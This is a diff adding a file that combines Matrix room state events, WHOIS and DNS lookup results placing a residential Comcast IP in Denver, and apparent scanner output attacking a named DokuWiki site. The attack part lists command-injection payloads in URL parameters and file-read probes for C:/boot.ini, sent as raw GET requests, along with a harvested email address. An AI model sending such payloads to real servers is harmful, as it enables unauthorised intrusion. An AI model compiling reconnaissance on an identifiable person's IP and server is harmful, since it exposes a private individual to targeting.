@@ -1,0 +1,164 @@
+{
+  "content": {
+    "join_rule": "invite"
+  },
+  "sender": "@fuckjoowce:matrix.thisisjoes.site",
+  "state_key": "",
+  "type": "m.room.join_rules",
+  "room_id": "!HDmUYXHdcrmSKoMwNy:matrix.thisisjoes.site"
+}
+
+{
+  "content": {
+    "alias": "#glowersclub:glowers.club"
+  },
+  "sender": "@q:glowers.club",
+  "state_key": "",
+  "type": "m.room.canonical_alias",
+  "room_id": "!HDmUYXHdcrmSKoMwNy:matrix.thisisjoes.site"
+}
+
+
+
+75.71.182.149
+whois
+	
+Comcast Cable Communications Holdings, Inc (C02610777)
+route
+	
+75.64.0.0/13
+bgp
+	
+AS7922
+asname
+	
+COMCAST-IBONE Comcast Cable Communicatio
+descr
+	
+Comcast Cable Communications, Inc.
+location
+	
+Denver, United States
+ptr
+	
+c-75-71-182-149.hsd1.co.comcast.net
+ns
+	
+ns1hwy.name.com
+a
+	
+2600:2000:1001::47
+route
+	
+2600:2000:1001::/48
+bgp
+	
+AS33517
+descr
+	
+Dynamic Network Services, Inc.
+location
+	
+United States
+ptr
+	
+ns1.name.com
+ns1bcp.name.com
+ns1bdg.name.com
+ns1bqx.name.com
+ns1cmt.name.com
+ns1cny.name.com
+ns1crv.name.com
+ns1cvw.name.com
+ns1cwy.name.com
+ns1dhl.name.com
+ns1dhq.name.com
+ns1djs.name.com
+ns1dns.name.com
+ns1dnx.name.com
+ns1fkl.name.com
+ns1gjz.name.com
+ns1glr.name.com
+ns1gmz.name.com
+ns1hnx.name.com
+ns1hwy.name.com
+ns1jlp.name.com
+ns1jsv.name.com
+ns1kpv.name.com
+ns1ksz.name.com
+ns1kwy.name.com
+ns1lmy.name.com
+ns1mpz.name.com
+ns1mtw.name.com
+ns1ntw.name.com
+ns1psw.name.com
+ns1qsy.name.com
+ns1stv.name.com
+ns1vwx.name.com
+
+
+
+glowers.club
+server: nginx/1.14.2
+host
+glowers.club
+
+payload
+$(echo 'h''l''U''a''A')
+place
+uri@do
+method
+GET
+uri
+https://glowers.club/wiki/doku.php?do=%24(echo%20'h''l''U''a''A')
+
+GET https://glowers.club/wiki/doku.php?do=%24(echo%20'h''l''U''a''A') HTTP/1.1
+
+payload
+$(echo 'R''p''4''i''J')
+place
+uri@t
+method
+GET
+uri
+https://glowers.club/wiki/lib/exe/js.php?t=%24(echo%20'R''p''4''i''J')
+
+GET https://glowers.club/wiki/lib/exe/js.php?t=%24(echo%20'R''p''4''i''J') HTTP/1.1
+
+uri
+https://glowers.club/wiki/doku.php?id=mmjd
+
+<form action="/wiki/doku.php?id=start" method="get" role="search" class="search doku_form" id="dw__search" accept-charset="utf-8">
+
+banner
+server: nginx/1.14.2
+host
+glowers.club
+uri
+https://glowers.club/wiki/feed.php
+email
+fuckjuice@undisclosed.example.com
+
+GET https://glowers.club/wiki/feed.php HTTP/1.1
+
+uri
+https://glowers.club/wiki/doku.php?id=mmjd
+host
+glowers.club
+version
+DokuWiki
+
+uri
+https://glowers.club/wiki/feed.php?mode=file%3A%2F%2F%2FC%3A%2Fboot.ini
+path
+file:///C:/boot.ini
+
+GET https://glowers.club/wiki/feed.php?mode=file%3A%2F%2F%2FC%3A%2Fboot.ini HTTP/1.1
+
+uri
+https://glowers.club/wiki/doku.php?id=mmjd&q=file%3A%2F%2F%2FC%3A%2Fboot.ini&do=search
+path
+file:///C:/boot.ini
+
+GET https://glowers.club/wiki/doku.php?id=mmjd&q=file%3A%2F%2F%2FC%3A%2Fboot.ini&do=search HTTP/1.1
+
